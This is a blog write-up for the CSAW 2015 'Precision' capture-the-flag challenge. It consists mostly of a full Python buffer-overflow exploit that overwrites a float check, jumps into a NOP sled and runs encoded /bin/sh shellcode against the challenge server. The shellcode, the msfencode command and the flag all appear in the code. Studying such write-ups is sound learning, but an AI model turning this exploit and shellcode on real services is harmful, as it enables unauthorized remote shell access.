---
layout: post
title: "CSAW | Precision writeup"
date: 2015-10-21
comments: true
categories:
---
Fun easy buffer exploitation challenge.
The address of the buffer is leaked and an overwritable variable must contain a specified floating point number.
Scanf has some bad chars so I used msfencode to convert it to an alphanumeric shellcode.

Guess I'll just hand you the exploit:

```python
import struct
import socket
import binascii
import telnetlib 

"""
bad chars : white spaces, read scanf manual
msfencode -i shellcode.bin -t python -e x86/alpha_mixed
thanks to likvidera for a nice exploit skeleton regarding the socket and telnetlib interaction.
flag{1_533_y0u_kn0w_y0ur_w4y_4r0und_4_buff3r}
"""

def readuntil(f, delimiter):
    res = ""
    while not res.endswith(delimiter):
        res += f.read(1)
    return res

#For the floating point conversion
def conv(num):
 return struct.pack("<Q",num)
 
#For 4 byte pointers
def conv2(num):
 return struct.pack("<I",num)

firstPadd = "A"*128
secondpadd = "B"*12

number = 0x40501555475a31a5 #64.33333000000000368

#/bin/sh not encoded
#shellcode = "\xeb\x18\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh"

#/bin/sh encoded alphanumeric
shellcode = "\x89\xe0\xda\xc1\xd9\x70\xf4\x5d\x55\x59\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
shellcode += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
shellcode += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
shellcode += "\x58\x50\x38\x41\x42\x75\x4a\x49\x58\x6b\x44\x58\x53"
shellcode += "\x6e\x6e\x69\x64\x36\x46\x68\x70\x31\x4f\x30\x6e\x68"
shellcode += "\x57\x36\x47\x77\x6f\x79\x32\x66\x36\x6c\x6c\x49\x6b"
shellcode += "\x43\x6c\x4d\x50\x4e\x46\x68\x4e\x6d\x62\x76\x64\x4c"
shellcode += "\x68\x30\x56\x6b\x48\x4d\x4f\x70\x5a\x48\x78\x63\x69"
shellcode += "\x6f\x59\x6f\x49\x6f\x74\x6f\x71\x72\x73\x59\x52\x4e"
shellcode += "\x34\x6f\x52\x53\x42\x48\x41\x41"


nops = "\x90"*28

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.210.15.77', 1259))
#s.connect(('localhost', 1337))

#raw_input() for local attachment of debugger

#convert socket to file 
cf = s.makefile("rwb", bufsize=0)

bufferAdr = readuntil(cf, "\n")[6:] #Read buffer address
bufferAdr = int(bufferAdr,16) #Convert to hex
nopsled = bufferAdr + 160 #Place into middle of nop sled

exploit = firstPadd+conv(number)+secondpadd+conv2(nopsled)+nops+shellcode

cf.write(exploit+"\n")

t = telnetlib.Telnet()
t.sock = s
t.interact() #Use our spawned shell
```